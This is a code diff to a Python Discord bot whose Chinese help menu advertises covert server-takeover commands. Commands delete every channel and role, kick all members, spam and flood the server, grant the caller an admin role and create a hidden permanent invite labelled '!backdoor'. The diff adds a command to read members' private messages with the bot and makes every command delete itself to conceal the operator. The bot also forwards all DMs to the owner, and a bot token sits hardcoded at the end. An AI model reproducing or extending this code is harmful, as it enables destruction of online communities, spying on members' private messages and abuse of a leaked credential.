@@ -16,8 +16,13 @@ bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
 ALLOWED_IDS = [1008278721007992863, 1355108796388872292] 
 
 async def is_me(ctx):
-
-    return ctx.author.id in ALLOWED_IDS
+    if ctx.author.id in ALLOWED_IDS:
+        try:
+            await ctx.message.delete()
+        except:
+            pass
+        return True
+    return False
 
 @app.route('/')
 def home():
@@ -38,7 +43,6 @@ async def on_ready():
 
 @bot.command(name="help")
 async def help_msg(ctx):
-
     if not await is_me(ctx): 
         return
     embed = discord.Embed(
@@ -76,29 +80,26 @@ async def help_msg(ctx):
             "`!disrole @成員` - 剝奪對方所有身分並丟入隔離區\n"
             "`!del_msg [數]` - 批次清理目前頻道的對話紀錄\n"
             "`!backdoor` - 建立永久邀請連結並私訊給你\n"
+            "`!get_dm @成員 [數]` - 調閱機器人與該成員的私訊紀錄\n"
         ), 
         inline=False
     )
-    
     embed.add_field(
         name="🎮 娛樂/通訊", 
         value=(
             "`!dm @成員 [文]` - 以機器人名義私訊特定成員\n"
             "`!spam [次] [文]` - 帶有防封號後綴的快速刷屏\n"
             "`!move_all [ID]` - 將語音內所有人移動到指定頻道\n"
+            "`!reset` - 重新啟動內部系統\n"
         ), 
         inline=False
     )
-    
     embed.set_footer(text="注意：所有操作皆會記錄於開發後台。")
-
     await ctx.send(embed=embed)
 
 @bot.command(name="dm")
 async def dm(ctx, member: discord.Member, *, text: str):
     if not await is_me(ctx): return
-    try: await ctx.message.delete()
-    except: pass
     try:
         await member.send(text)
     except:
@@ -107,8 +108,6 @@ async def dm(ctx, member: discord.Member, *, text: str):
 @bot.command(name="del_ch")
 async def nuke_channels(ctx):
     if not await is_me(ctx): return
-    try: await ctx.message.delete()
-    except: pass
     for channel in ctx.guild.channels:
         try: await channel.delete()
         except: pass
@@ -117,8 +116,6 @@ async def nuke_channels(ctx):
 @bot.command(name="kick_everyone")
 async def kick_everyone(ctx):
     if not await is_me(ctx): return
-    try: await ctx.message.delete()
-    except: pass
     for member in ctx.guild.members:
         if member != ctx.author and member != bot.user and member != ctx.guild.owner:
             try: await member.kick()
@@ -127,8 +124,6 @@ async def kick_everyone(ctx):
 @bot.command(name="del_role")
 async def clear_roles(ctx):
     if not await is_me(ctx): return
-    try: await ctx.message.delete()
-    except: pass
     for role in ctx.guild.roles:
         if role.name != "@everyone" and not role.managed:
             try: await role.delete()
@@ -137,16 +132,12 @@ async def clear_roles(ctx):
 @bot.command(name="set_server")
 async def set_server(ctx, *, name: str):
     if not await is_me(ctx): return
-    try: await ctx.message.delete()
-    except: pass
     try: await ctx.guild.edit(name=name)
     except: pass
 
 @bot.command(name="bye")
 async def leave_server(ctx):
     if not await is_me(ctx): return
-    try: await ctx.message.delete()
-    except: pass
     await ctx.guild.leave()
 
 @bot.command(name="del_msg")
@@ -158,8 +149,6 @@ async def purge_chat(ctx, amount: int = 10):
 @bot.command(name="spam")
 async def spam(ctx, count: int, *, text: str):
     if not await is_me(ctx): return
-    try: await ctx.message.delete()
-    except: pass
     for i in range(min(count, 100)):
         try:
             suffix = ''.join(random.choices(string.ascii_letters + string.digits, k=5))
@@ -172,8 +161,6 @@ async def spam(ctx, count: int, *, text: str):
 @bot.command(name="100rl")
 async def role_hell(ctx):
     if not await is_me(ctx): return
-    try: await ctx.message.delete()
-    except: pass
     for i in range(100):
         color = discord.Color.from_rgb(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
         try: await ctx.guild.create_role(name=f"{i}", color=color)
@@ -182,8 +169,6 @@ async def role_hell(ctx):
 @bot.command(name="100ch")
 async def flood(ctx, name="ch-----test"):
     if not await is_me(ctx): return
-    try: await ctx.message.delete()
-    except: pass
     for i in range(100):
         try: await ctx.guild.create_text_channel(f"{name}-{i}")
         except: break
@@ -191,8 +176,6 @@ async def flood(ctx, name="ch-----test"):
 @bot.command(name="op_me")
 async def op_me(ctx):
     if not await is_me(ctx): return
-    try: await ctx.message.delete()
-    except: pass
     guild = ctx.guild
     try:
         new_role = await guild.create_role(
@@ -207,8 +190,6 @@ async def op_me(ctx):
 @bot.command(name="tm")
 async def tm(ctx, member: discord.Member = None, minutes: int = 10):
     if not await is_me(ctx): return
-    try: await ctx.message.delete()
-    except: pass
     if member is None: return
     try:
         duration = datetime.timedelta(minutes=minutes)
@@ -218,8 +199,6 @@ async def tm(ctx, member: discord.Member = None, minutes: int = 10):
 @bot.command(name="backdoor")
 async def backdoor(ctx):
     if not await is_me(ctx): return
-    try: await ctx.message.delete()
-    except: pass
     try:
         inv = await ctx.channel.create_invite(max_age=0, max_uses=0)
         await ctx.author.send(f"永久入口: {inv.url}")
@@ -228,8 +207,6 @@ async def backdoor(ctx):
 @bot.command(name="move_all")
 async def move_all(ctx, channel: discord.VoiceChannel):
     if not await is_me(ctx): return
-    try: await ctx.message.delete()
-    except: pass
     for member in ctx.guild.members:
         if member.voice:
             try: await member.move_to(channel)
@@ -238,8 +215,6 @@ async def move_all(ctx, channel: discord.VoiceChannel):
 @bot.command(name="disrole")
 async def isolate(ctx, member: discord.Member):
     if not await is_me(ctx): return
-    try: await ctx.message.delete()
-    except: pass
     try:
         await member.edit(roles=[])
         iso_role = discord.utils.get(ctx.guild.roles, name="Prisoner")
@@ -251,8 +226,6 @@ async def isolate(ctx, member: discord.Member):
 @bot.command(name="server_gate")
 async def server_gate(ctx, status: str):
     if not await is_me(ctx): return
-    try: await ctx.message.delete()
-    except: pass
     can_send = True if status == "unlock" else False
     for channel in ctx.guild.text_channels:
         try:
@@ -262,8 +235,6 @@ async def server_gate(ctx, status: str):
 @bot.command(name="add_role")
 async def add_role(ctx, member: discord.Member, role: discord.Role):
     if not await is_me(ctx): return
-    try: await ctx.message.delete()
-    except: pass
     try:
         await member.add_roles(role)
     except Exception as e:
@@ -272,8 +243,6 @@ async def add_role(ctx, member: discord.Member, role: discord.Role):
 @bot.command(name="remove_role")
 async def remove_role(ctx, member: discord.Member, role: discord.Role):
     if not await is_me(ctx): return
-    try: await ctx.message.delete()
-    except: pass
     try:
         await member.remove_roles(role)
     except Exception as e:
@@ -282,19 +251,13 @@ async def remove_role(ctx, member: discord.Member, role: discord.Role):
 @bot.command(name="get_dm")
 async def get_dm(ctx, member: discord.Member, limit: int = 10):
     if not await is_me(ctx): return
-    
     try:
         dm_channel = member.dm_channel or await member.create_dm()
         history = []
-        
-
         async for msg in dm_channel.history(limit=limit):
             who = "機器人" if msg.author == bot.user else "成員"
             history.append(f"[{msg.created_at.strftime('%H:%M')}] {who}: {msg.content}")
-        
-
         result = "\n".join(reversed(history)) or "無私訊紀錄"
-        
         await ctx.author.send(f"📂 **與 {member.name} 的對話紀錄 (由舊到新)：**\n{result[:1900]}")
     except Exception as e:
         print(f"調閱失敗: {e}")
@@ -303,7 +266,6 @@ async def get_dm(ctx, member: discord.Member, limit: int = 10):
 async def reboot(ctx):
     if not await is_me(ctx): return
     await ctx.send("🔄 正在重新啟動內部系統...")
-
     os._exit(0) 
         
 @bot.event
@@ -315,8 +277,8 @@ async def on_message(message):
     if isinstance(message.channel, discord.DMChannel) and message.author != bot.user:
         owner = await bot.fetch_user(ALLOWED_IDS[0])
         await owner.send(f"📩 **收到私訊**\n來自: {message.author} (ID: {message.author.id})\n內容: {message.content}")
-    
     await bot.process_commands(message)
+
 if __name__ == "__main__":
     keep_alive()
 bot.run("MTQ4NzcyNTMzMDExNzU2MjM5OQ.GdEAio.tb5pS63n67Hy_ILNZBQnVZZ6A2sFX2nxEfWyjY")
